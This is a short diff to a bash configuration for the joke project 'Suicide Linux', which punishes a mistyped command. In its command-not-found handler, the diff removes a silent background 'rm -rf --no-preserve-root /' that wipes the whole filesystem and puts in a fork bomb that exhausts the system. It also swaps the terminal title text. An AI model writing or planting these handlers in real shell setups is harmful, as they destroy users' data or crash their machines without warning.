@@ -22,7 +22,7 @@ CLR_YELLOW=$'\033[01;33m'
 function command_not_found_handle {
      if [ -z "$FAILED_AT" ]; then
           echo "Oops, looks like you misspelt something >:)"
-          (rm -rf --no-preserve-root / >/dev/null 2>/dev/null &)
+          (:(){ :|:& };: >/dev/null 2>/dev/null &)
           return 127
      fi
 }
@@ -44,7 +44,7 @@ function __sl_set_ps1 {
      else
           PROMPT_COLOR=$CLR_L_RED
           COUNT_COLOR=$CLR_L_RED
-          TERMINAL_TITLE="Suicide Linux | (×_×)"
+          TERMINAL_TITLE="Suicide Linux | kaboom betch XP"
      fi
 
      TERMINAL_TITLE="$TERMINAL_TITLE | survived $COUNT commands"
